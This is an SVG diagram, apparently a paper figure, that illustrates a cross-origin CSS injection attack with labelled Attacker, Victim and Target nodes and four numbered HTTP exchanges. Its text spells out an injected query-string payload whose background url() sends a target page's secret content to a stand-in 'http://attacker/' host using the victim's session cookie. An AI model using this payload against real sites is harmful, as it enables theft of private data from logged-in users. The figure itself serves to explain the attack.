<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   version="1.1"
   width="875"
   height="392">
  <defs>
    <marker id="Arrow2Lend" orient="auto" style="overflow:visible">
      <path
         d="M 8.7185878,4.0337352 -2.2072895,0.01601326 8.7185884,-4.0017078 c -1.7454984,2.3720609 -1.7354408,5.6174519 0,8.035443 z"
         transform="matrix(-1.1,0,0,-1.1,-1.1,0)"/>
    </marker>
  </defs>
  <g transform="translate(-76.600616,-661.36218)">
    <path d="m 519.60062,777.36218 397,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 916.60062,787.36218 -397,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 509.60062,877.36218 -390,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 119.60062,887.36218 390,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 509.60062,1021.3622 -390,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 119.60062,1031.3622 390,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 519.60062,951.36218 397,0"
       style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 916.60062,961.36218 -397,0"
	  style="stroke:#000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path d="m 509.50925,762.36218 5,0 5,0 0,64.49851 12.09137,6.25 -25,12.5 12.90863,6.25 0,200.50151 -10,0 0,-200.50151 -12.90863,-6.25 25,-12.5 -12.09137,-6.25 0,-64.49851 z"
	  fill="#808080"/>
    <path d="m 109.60062,762.36218 5,0 5,0 0,64.49851 12.09137,6.25 -25,12.5 12.90863,6.25 0,200.50151 -10,0 0,-200.50151 -12.90863,-6.25 25,-12.5 -12.09137,-6.25 0,-64.49851 z"
	  fill="#808080"/>
    <path d="m 916.60062,762.36218 5,0 5,0 0,64.49851 12.09137,6.25 -25,12.5 12.90863,6.25 0,200.50151 -10,0 0,-200.50151 -12.90863,-6.25 25,-12.5 -12.09137,-6.25 0,-64.49851 z"
	  fill="#808080"/>
    <circle style="fill:#ffffff;stroke:#000000;stroke-width:2"
	    cx="522" cy="91.000031" r="11"
	    transform="translate(40.468516,678.36218)"/>
    <circle style="fill:#ffffff;stroke:#000000;stroke-width:2"
	    cx="522" cy="91.000031" r="11"
	    transform="translate(-51.081484,778.27218)"/>
    <circle style="fill:#ffffff;stroke:#000000;stroke-width:2"
	    cx="522" cy="91.000031" r="11"
	    transform="translate(32.848516,851.50218)"/>
    <circle style="fill:#ffffff;stroke:#000000;stroke-width:2"
	    cx="522" cy="91.000031" r="11"
	    transform="translate(-46.051484,921.27218)"/>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier"
	  x="314.24985" y="871.36218">GET /hampsterdance</text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
	  ><tspan x="314.09183" y="895.36218">...</tspan
	  ><tspan x="314.09183" y="910.36218">&lt;link rel=&quot;stylesheet&quot;</tspan
	  ><tspan x="314.09183" y="925.36218">href=&quot;http://target/privatepage?</tspan
	  ><tspan x="314.09183" y="940.36218">q1={}body{background:</tspan
	  ><tspan x="314.09183" y="955.36218">url(http://attacker/%3F&amp;q2=)}&quot;&gt;</tspan
	  ><tspan x="314.09183" y="970.36218">...</tspan></text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
	  x="313.78128" y="1015.3622">GET /?<tspan font-style="italic">SECRET_INFORMATION</tspan></text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier"
	  x="314.25589" y="1046.3622">HTTP/1.1 204 Owned</text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
	  x="726.24988" y="769.36218">POST /login</text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
	  ><tspan x="726.24988" y="801.36218">HTTP/1.1 200 OK</tspan
	  ><tspan x="726.24988" y="816.36218">Set-Cookie: SID=2DK3P9YOX5</tspan
	  ><tspan x="726.24988" y="831.36218">...</tspan></text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
	  ><tspan x="720.19324" y="915.14154">GET /privatepage?q1=<tspan font-weight="bold">{}body{background:</tspan></tspan
	  ><tspan x="720.19324" y="930.81274"><tspan font-weight="bold">url(http://attacker/%3F</tspan>&amp;q2=<tspan font-weight="bold">)}</tspan></tspan
	  ><tspan x="720.19324" y="945.85913">Cookie: SID=2DK3P9YOX5</tspan></text>
    <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
	  ><tspan x="719.2179" y="976.12683">Content-Type: text/html</tspan
	  ><tspan x="719.2179" y="991.12323">&lt;!doctype html&gt;&lt;html&gt;...</tspan
	  ><tspan x="719.2179" y="1006.7444" font-weight="bold">{}body{background:</tspan
	  ><tspan x="719.2179" y="1021.7408"><tspan font-weight="bold">url(http://attacker/?</tspan><tspan font-style="italic">SECRET_INFORMATION</tspan><tspan font-weight="bold">)}</tspan></tspan
	  ><tspan x="719.2179" y="1037.3745">...&lt;/html&gt;</tspan></text>
    <text style="font-size:20px;font-family:Helvetica"
	  x="557.07782" y="776.45221">1</text>
    <text style="font-size:20px;font-family:Helvetica"
	  x="465.46851" y="876.36218">2</text>
    <text style="font-size:20px;font-family:Helvetica"
	  x="549.46851" y="949.36218">3</text>
    <text style="font-size:20px;font-family:Helvetica"
	  x="470.46851" y="1019.3622">4</text>
    <text style="font-size:20px;text-align:center;text-anchor:middle;font-family:Helvetica"
	  x="515.42908" y="757.90216">Victim</text>
    <text style="font-size:20px;text-align:center;text-anchor:middle;font-family:Helvetica"
	  x="114.15183" y="755.90216">Attacker</text>
    <text style="font-size:20px;text-align:center;text-anchor:middle;font-family:Helvetica"
	  x="921.62408" y="756.0022">Target</text>
    <path d="m 77.634976,736.27595 c 0.48744,-3.38307 1.14454,-4.77347 4.91681,-10.40379 l 3.32125,-4.95712 -4.00803,-2.0152 c -2.20441,-1.10836 -4.00803,-2.11242 -4.00803,-2.23125 0,-0.11883 1.14,-0.83652 2.53334,-1.59487 1.39333,-0.75835 2.53333,-1.53463 2.53333,-1.72507 0,-0.19044 -1.39172,-0.8952 -3.09272,-1.56614 -1.701,-0.67094 -3.10135,-1.44789 -3.11189,-1.72655 -0.0154,-0.40796 7.51944,-4.75741 9.49794,-5.48262 0.28283,-0.10367 0.003,-1.09057 -0.63333,-2.23387 -1.32922,-2.38811 -1.44172,-4.04061 -0.37843,-5.55867 0.79324,-1.1325 3.95674,-2.45328 4.73056,-1.97503 0.45476,0.28106 2.18167,-3.50712 1.78131,-3.90749 -0.12122,-0.12122 -2.37283,0.28717 -5.00357,0.90754 -6.39186,1.5073 -6.67982,1.2163 -2.66579,-2.69389 1.45424,-1.41663 3.33524,-2.94992 4.18,-3.40732 1.01754,-0.55096 3.33145,-3.54341 6.85592,-8.86637 3.251659,-4.91094 5.647024,-8.04268 6.161164,-8.05518 0.46264,-0.0112 1.99493,0.89156 3.40509,2.00623 2.86298,2.26305 3.40132,2.42259 3.84664,1.14 0.16932,-0.48767 1.29417,-1.98575 2.49967,-3.32907 l 2.19182,-2.4424 3.4878,3.91018 c 1.9183,2.1506 3.71581,4.10761 3.99448,4.34892 0.27866,0.24131 3.69866,2.00227 7.6,3.91324 l 7.09333,3.4745 -3.94117,0.64417 c -2.16765,0.35429 -4.0543,0.82721 -4.19257,1.05094 -0.13827,0.22372 0.44655,1.54109 1.29961,2.92749 1.49706,2.43304 1.60724,2.50459 3.16762,2.05708 2.04136,-0.58546 3.11836,-0.24302 4.41329,1.40323 1.29689,1.64872 1.30143,3.52992 0.0132,5.47505 -0.55366,0.836 -1.00816,1.67254 -1.00999,1.85897 -0.005,0.45031 3.96408,1.39448 8.35666,1.98817 4.60739,0.62273 4.81333,0.71433 4.81333,2.14098 0,0.84314 -0.91568,2.00302 -3.04,3.85069 -1.672,1.45426 -3.04,2.81748 -3.04,3.02938 0,0.21189 1.14,0.91921 2.53334,1.57181 1.39333,0.6526 2.53333,1.32637 2.53333,1.49725 0,0.17089 -1.25565,1.55075 -2.79032,3.06636 l -2.79032,2.75566 4.29878,4.32037 c 3.21056,3.22667 4.5068,4.93149 5.12049,6.73448 0.79873,2.34663 0.78843,2.48117 -0.36846,4.81333 -0.81871,1.6504 -1.74364,2.66299 -2.9635,3.24436 -2.70921,1.29117 -10.69173,2.06805 -23.74444,2.31088 l -11.83776,0.22022 0.81776,-1.16753 c 1.02632,-1.46528 1.05459,-3.66143 0.0578,-4.48871 -0.418,-0.34691 -0.76,-1.13749 -0.76,-1.75685 0,-1.93235 1.4789,-2.73792 5.33141,-2.90404 3.34768,-0.14436 3.53525,-0.21672 3.53525,-1.36389 0,-1.86262 -1.33226,-2.42335 -3.90505,-1.64358 -3.7563,1.13848 -5.21718,1.23475 -5.91829,0.38996 -1.49363,-1.79972 0.91343,-4.34752 4.57847,-4.84617 2.50702,-0.34109 3.1204,-1.36993 1.11658,-1.87285 -0.91157,-0.22879 -2.22894,-0.035 -3.70933,0.54581 -1.26264,0.49534 -2.77504,0.9008 -3.36088,0.90103 -2.40762,10e-4 -3.47286,5.11756 -2.15503,10.35111 0.65339,2.59487 0.24544,3.19113 -2.19281,3.20504 -1.09449,0.006 -1.40276,-0.26399 -1.58057,-1.38557 -0.12149,-0.76634 -0.13917,0.25966 -0.0393,2.28 l 0.18159,3.67333 -13.452064,0 -13.45206,0 0.34675,-2.40667 z m 47.701204,1.12842 c 1.19483,-0.49923 1.9586,-0.59048 2.16377,-0.25851 0.1744,0.28219 0.30508,-0.73637 0.29039,-2.26348 -0.0147,-1.5271 -0.1027,-2.55077 -0.19559,-2.27482 -0.0929,0.27595 -1.07222,0.50173 -2.17629,0.50173 -1.98997,0 -2.00474,-0.0143 -1.70037,-1.64667 0.16886,-0.90567 0.3502,-3.47067 0.40296,-5.7 0.16425,-6.94027 -2.32538,-9.87757 -8.37355,-9.87921 -3.68266,-10e-4 -6.47719,1.24143 -6.47719,2.87972 0,1.44279 0.3971,1.45195 4.11855,0.095 2.80493,-1.02273 3.02269,-1.03403 4.26301,-0.22134 1.94124,1.27195 1.41454,2.46557 -1.29185,2.92759 -2.4863,0.42444 -4.71819,1.81377 -4.97005,3.09379 -0.23967,1.21812 2.03605,1.59283 3.8806,0.63898 3.19417,-1.65177 6.6664,-0.75588 6.6664,1.72002 0,1.93171 -0.51191,2.18024 -4.32063,2.09765 -2.31076,-0.0501 -3.41866,0.15277 -3.99797,0.73208 -1.86098,1.86098 -0.44774,3.32312 3.034,3.13897 l 2.45698,-0.12996 0.33458,1.98528 c 0.54108,3.21057 2.40363,4.02078 5.89225,2.56314 z m -36.329194,-3.79949 c 0.9735,-0.28476 2.56799,-0.62634 3.54333,-0.75907 3.61953,-0.49257 11.357394,-2.18593 10.177034,-2.22715 -0.67263,-0.0235 -3.252135,0.34628 -5.732234,0.82171 -3.92879,0.75314 -4.56934,0.76945 -4.97594,0.12667 -0.3953,-0.62491 -0.46787,-0.61117 -0.47444,0.0898 -0.008,0.84695 -1.39811,1.43319 -3.42776,1.44551 -0.627,0.004 -1.14,0.23492 -1.14,0.51358 0,0.61756 -0.12131,0.61821 2.03001,-0.0111 z m 3.72655,-3.78893 c 0.1604,-0.418 0.0708,-0.76 -0.19913,-0.76 -0.26992,0 -0.49076,0.342 -0.49076,0.76 0,0.418 0.0896,0.76 0.19913,0.76 0.10951,0 0.33036,-0.342 0.49076,-0.76 z m 41.490104,-0.66037 c 2.99567,-0.46532 5.44667,-1.01294 5.44667,-1.21693 0,-0.20399 -0.285,-0.28394 -0.63334,-0.17765 -0.34833,0.10627 -3.19833,0.58587 -6.33333,1.06577 -3.135,0.47989 -5.7,1.09418 -5.7,1.36507 0,0.27089 0.399,0.33891 0.88667,0.15115 0.48766,-0.18775 3.33766,-0.72209 6.33333,-1.18741 z m -27.44774,-5.29675 c 0.16923,-1.04109 0.6666,-2.29264 1.10527,-2.78122 1.17681,-1.31068 0.57668,-3.33996 -1.31391,-4.44282 -2.62596,-1.53183 -6.37633,-4.8735 -7.487675,-6.67169 -1.409639,-2.28086 -2.341649,-2.11288 -3.560099,0.64163 -1.15594,2.61319 -1.85507,2.69774 -0.97993,0.11851 0.60428,-1.78096 3.887509,-5.65749 4.492599,-5.30446 0.74589,0.43516 7.958935,-3.47372 8.131705,-4.40671 0.14953,-0.80749 -0.0488,-0.88838 -1.43294,-0.58438 -5.820455,1.27839 -9.617514,-3.73473 -6.409425,-8.46213 1.069345,-1.57576 1.110105,-1.8151 0.38,-2.23086 -0.44982,-0.25615 -1.45669,-0.38937 -2.237479,-0.29605 -1.73214,0.20704 -2.18217,1.24188 -2.66325,6.12415 -0.19632,1.99227 -0.565,3.7509 -0.81931,3.90807 -0.2543,0.15717 -1.05103,-0.0999 -1.7705,-0.57135 -1.68994,-1.1073 -1.90081,-0.76093 -2.92104,4.79805 -1.00901,5.49781 -1.01171,10.17308 -0.007,12.58133 1.50243,3.6022 5.49881,6.75488 10.614309,8.37343 5.504255,1.74156 6.485265,1.6284 6.878935,-0.7935 z m 22.60794,-2.22023 c 1.71443,-1.01422 4.21725,-2.96147 5.56181,-4.32724 l 2.44466,-2.48321 0,-4.6661 0,-4.66609 -3.41045,-7.00385 c -2.9702,-6.09973 -3.53986,-6.96276 -4.41301,-6.68563 -0.84155,0.26709 -1.28379,-0.24022 -2.75349,-3.15866 -0.96301,-1.91227 -2.13682,-3.79713 -2.60848,-4.18857 -0.74771,-0.62054 -0.9479,-0.58817 -1.56274,0.25267 -0.9423,1.28868 -0.89044,1.65695 0.28591,2.03031 0.5451,0.173 1.59551,1.03287 2.33425,1.91081 1.13132,1.3445 1.30378,1.94565 1.09348,3.81143 -0.16709,1.48242 -0.70286,2.68819 -1.61966,3.64512 -1.09083,1.13859 -1.26578,1.62463 -0.85861,2.38543 0.40437,0.75558 0.94456,0.91417 2.58192,0.75802 1.13881,-0.1086 2.1837,-0.38052 2.32198,-0.60425 0.38186,-0.61788 5.19509,1.87535 5.79906,3.00388 0.91264,1.70528 0.58494,1.80566 -0.98488,0.30168 -0.83309,-0.79815 -1.59064,-1.35381 -1.68343,-1.23479 -0.0928,0.11902 -0.59128,1.35502 -1.10774,2.74667 -0.51645,1.39165 -2.62337,5.02265 -4.68204,8.06888 l -3.74304,5.53861 1.29882,2.38635 c 0.71435,1.31249 1.29881,2.7545 1.29881,3.20445 0,1.23142 0.97456,1.00454 4.40687,-1.02592 z m -18.08687,-5.77477 1.77334,-0.98965 -2.78667,0.31952 c -3.1459,0.36072 -3.27072,0.41238 -2.8075,1.16188 0.49208,0.79621 1.81898,0.62543 3.82083,-0.49175 z m 10.63224,-0.61454 c -0.0149,-2.19226 -0.49813,-2.37157 -4.17086,-1.54768 -1.87885,0.42148 -3.30306,0.94922 -3.1649,1.17277 0.13816,0.22354 0.64997,0.30696 1.13736,0.18536 0.48739,-0.1216 1.91216,0.10527 3.16616,0.50414 3.07412,0.97781 3.04106,0.98124 3.03224,-0.31459 z m -15.28934,-2.52047 c 0.14157,-1.70234 0.0226,-1.90629 -1.26666,-2.17241 -0.7826,-0.16153 -2.5059,-0.7196 -3.82957,-1.24015 -1.44994,-0.57021 -2.406665,-0.73172 -2.406665,-0.40628 0,0.2971 1.238925,1.7791 2.753165,3.29335 3.24656,3.24656 4.51181,3.38654 4.74973,0.52549 z m 6.30377,1.29264 c 0.57441,-0.34058 0.45526,-3.09918 -0.15002,-3.47327 -0.29151,-0.18016 -1.65951,-0.17222 -3.04,0.0176 l -2.50998,0.34521 0,2.02667 0,2.02667 2.66,-0.35881 c 1.463,-0.19734 2.831,-0.46019 3.04,-0.58411 z m 10.84603,-0.0388 c 0.38376,-0.48766 0.92396,-1.27452 1.20043,-1.74857 0.45095,-0.77319 0.34567,-0.80717 -1.02282,-0.33011 -1.7934,0.62518 -2.1445,1.06489 -1.72441,2.15963 0.39504,1.02944 0.68494,1.01427 1.5468,-0.081 z m -6.13683,-0.94826 c 3.45209,-0.86714 3.61212,-1.08808 2.69456,-3.72018 -0.54403,-1.56061 -0.68668,-1.63817 -2.55263,-1.3879 -3.27302,0.43901 -4.28977,1.40243 -4.05692,3.84414 0.10939,1.14705 0.29909,2.08554 0.42155,2.08554 0.12246,0 1.69451,-0.36972 3.49344,-0.8216 z m 7.48987,-2.33341 c 1.22158,-0.44179 1.38409,-0.7138 1.10414,-1.84818 -0.47881,-1.94023 -0.87152,-2.15708 -3.07674,-1.6989 -2.1847,0.45391 -2.57656,1.20793 -1.75321,3.3735 0.40077,1.05409 0.75382,1.31586 1.41378,1.04827 0.48379,-0.19617 1.52421,-0.58978 2.31203,-0.87469 z m -11.81907,-1.96794 c 1.254,-0.57605 3.534,-1.23028 5.06667,-1.45383 4.70499,-0.68627 6.84565,-1.4538 9.42695,-3.38002 l 2.47971,-1.8504 -2.13807,2.23389 c -1.63419,1.70743 -2.06804,2.50171 -1.84091,3.37027 0.16344,0.625 0.47691,1.13637 0.6966,1.13637 0.67437,0 3.15027,-4.62071 3.2279,-6.02413 0.0402,-0.7274 0.2544,-1.60915 0.47593,-1.95945 0.25268,-0.39955 0.0803,-0.76067 -0.4626,-0.96899 -0.90459,-0.34712 -2.23885,0.9696 -2.23885,2.20941 0,0.36474 -0.36822,0.66316 -0.81827,0.66316 -0.75325,0 -0.75325,-0.0992 0,-1.24884 1.14895,-1.75352 1.05813,-1.88208 -1.05024,-1.48654 -1.13455,0.21284 -2.34438,0.91606 -3.07994,1.79023 -1.95534,2.32378 -3.92023,3.46643 -6.91186,4.01946 -3.23335,0.59772 -6.50027,-0.0399 -8.18283,-1.59695 -1.02699,-0.9504 -1.0839,-0.94814 -3.67334,0.14587 -1.4466,0.61117 -2.63018,1.27585 -2.63018,1.47707 0,0.20122 0.684,0.51608 1.52,0.6997 1.46067,0.32082 1.85212,0.76565 1.22534,1.39243 -0.16206,0.16207 -1.06674,-0.0279 -2.0104,-0.42222 -1.97778,-0.82637 -3.268275,-0.92335 -3.268275,-0.24562 0,0.25919 1.196995,0.93131 2.659995,1.4936 3.61245,1.3884 8.51117,1.39075 11.52667,0.006 z m 4.64639,-4.0828 c 2.22027,-0.66521 5.48694,-3.92264 5.48694,-5.47142 0,-1.62491 -2.72257,-4.23813 -6.09459,-5.84981 l -3.1556,-1.50824 -2.25174,2.53094 c -2.6514,2.98017 -4.20473,5.7822 -4.20473,7.58487 0,2.76488 5.32733,4.17946 10.21972,2.71366 z m -28.796844,-4.56142 c 0.95616,-3.98401 0.71345,-4.71376 -1.39201,-4.18532 -1.85681,0.46603 -2.96822,2.26074 -2.53415,4.09217 0.32618,1.37627 2.05037,3.72698 2.73365,3.72698 0.17621,0 0.71285,-1.63522 1.19251,-3.63383 z m 18.507304,-1.03172 c 0.10094,-0.26892 1.30707,-1.95484 2.6803,-3.74649 1.61645,-2.10899 2.26632,-3.32486 1.84315,-3.44843 -0.3595,-0.10499 -2.87572,-0.47201 -5.59161,-0.81561 -5.43876,-0.68808 -5.87928,-0.56054 -7.255425,2.10065 -1.607389,3.10834 -0.29477,5.87023 3.104775,6.53282 2.24468,0.4375 4.94161,0.11558 5.21881,-0.62294 z m -0.27325,-5.26562 c -0.38857,-1.01261 0.84381,-1.8512 1.68929,-1.14951 0.76668,0.63629 0.32335,1.96064 -0.65633,1.96064 -0.39693,0 -0.86176,-0.36501 -1.03296,-0.81113 z m 18.58307,-2.03358 c 0,-1.37753 -0.37954,-2.16994 -1.57359,-3.28534 -0.86547,-0.80847 -2.0634,-1.46995 -2.66207,-1.46995 -1.14536,0 -5.83256,3.43761 -5.87218,4.30667 -0.0127,0.27867 1.21128,1.15163 2.71996,1.93991 1.50868,0.78828 3.15674,1.89035 3.66234,2.44904 0.91433,1.01032 0.92686,1.00733 2.32241,-0.55457 0.9798,-1.09658 1.40313,-2.11808 1.40313,-3.38576 z m -4.4638,-0.3327 c -0.72686,-0.87582 0.0825,-2.12354 1.11933,-1.72565 0.99395,0.38141 1.03738,1.04455 0.11836,1.80727 -0.5218,0.43306 -0.82726,0.41291 -1.23769,-0.0816 z m 13.89182,4.31741 c 0.3702,-0.48766 0.68033,-1.83912 0.6892,-3.00322 0.0129,-1.69834 -0.24991,-2.32581 -1.33017,-3.17555 -1.29506,-1.01869 -2.81342,-1.02649 -3.8993,-0.02 -0.4078,0.37797 2.98754,7.08547 3.58666,7.08547 0.1543,0 0.58342,-0.399 0.95361,-0.88667 z m -22.08693,-6.08 c 0.006,-0.65371 0.11643,-0.71538 0.4214,-0.23473 0.30244,0.47667 1.05189,0.0137 2.78779,-1.72222 1.30579,-1.30579 2.28372,-2.4646 2.17319,-2.57513 -0.28198,-0.28197 -12.64316,2.44395 -13.16097,2.90229 -0.41639,0.36857 5.14434,2.35807 6.88416,2.46299 0.52443,0.0316 0.88984,-0.30877 0.89443,-0.8332 z"/>
    <path d="m 524.56334,727.25976 c 11.19672,-3.87309 20.47701,-7.16133 20.62287,-7.30719 0.14585,-0.14585 1.65926,-11.12529 3.36312,-24.39873 1.70385,-13.27345 3.25062,-25.04056 3.43725,-26.14913 0.27207,-1.61607 0.13054,-2.01559 -0.71405,-2.01559 -1.19454,0 -36.91382,11.71298 -37.56978,12.31979 -0.23421,0.21666 -1.5565,6.78619 -2.93841,14.59895 -1.38192,7.81278 -2.58571,14.26368 -2.67507,14.33537 -0.0894,0.0717 -7.06978,1.88712 -15.51198,4.0343 -9.27101,2.35797 -15.34949,4.19635 -15.34949,4.6423 0,1.03225 24.25258,17.05637 25.75286,17.01539 0.67377,-0.0185 10.38596,-3.20236 21.58268,-7.07546 z m -33.29058,-2.1323 c -9.37795,-6.25008 -10.86317,-7.44576 -9.7053,-7.81325 0.75189,-0.23864 7.23814,-1.9238 14.4139,-3.7448 7.17577,-1.82099 13.24112,-3.5375 13.47857,-3.81448 0.23744,-0.27697 1.48487,-6.64339 2.77206,-14.14757 1.2872,-7.50419 2.65913,-13.95896 3.04873,-14.34395 0.66612,-0.6582 34.56415,-12.16459 34.88674,-11.84201 0.35015,0.35015 -6.1259,48.56141 -6.58877,49.0504 -0.60197,0.63594 -38.94598,13.95943 -40.30328,14.00428 -0.51165,0.0169 -5.91285,-3.28996 -12.00265,-7.34862 z m 13.22904,1.02381 c -0.0143,-0.79301 -9.393,-7.28712 -10.52397,-7.28712 -1.84572,0 -0.0149,1.91828 4.5873,4.8064 5.58441,3.50452 5.95793,3.6606 5.93667,2.48072 z m 9.93687,-3.56037 c 0,-0.61831 -11.83415,-6.82766 -13.01254,-6.82766 -1.95014,0 0.0899,1.59101 5.5591,4.33562 6.35643,3.1898 7.45344,3.55659 7.45344,2.49204 z m 9.92289,-4.29271 c 0,-0.31128 -2.02334,-1.32646 -4.49631,-2.25595 -2.47297,-0.92949 -5.43742,-2.07021 -6.58764,-2.53494 -2.60116,-1.05094 -3.18022,-1.05895 -3.18022,-0.0439 0,0.45203 2.76958,1.80889 6.35686,3.11431 6.57887,2.39406 7.90731,2.68311 7.90731,1.72049 z m 16.94866,-22.84588 c 1.27499,-8.44222 2.30889,-15.83788 2.29757,-16.43479 -0.0286,-1.50124 -0.66049,-1.4269 -13.60917,1.60083 -9.32055,2.17939 -11.49504,2.88989 -11.83776,3.86796 -0.70012,1.99807 -3.93552,21.34744 -3.62193,21.66104 0.28061,0.28059 22.72925,4.65445 23.88881,4.65445 0.31037,0 1.60749,-6.90727 2.88248,-15.34949 z m -16.01839,11.27827 c -4.77539,-0.89293 -8.78415,-1.72293 -8.90836,-1.84447 -0.1242,-0.12153 0.5474,-4.68433 1.49245,-10.13955 l 1.71829,-9.91859 9.67081,-2.2646 c 5.31894,-1.24553 10.29873,-2.40871 11.06621,-2.58484 1.06095,-0.2435 1.39593,-0.044 1.39758,0.83229 0.002,1.42626 -3.68184,26.26768 -4.06471,27.4046 -0.18183,0.53989 -0.86676,0.70619 -1.98372,0.48163 -0.93831,-0.18863 -5.61316,-1.07354 -10.38855,-1.96647 z"/>
    <image xlink:href="Wireframe.png"
	   x="890.79248" y="669.54852" width="60" height="67"/>
  </g>
</svg>
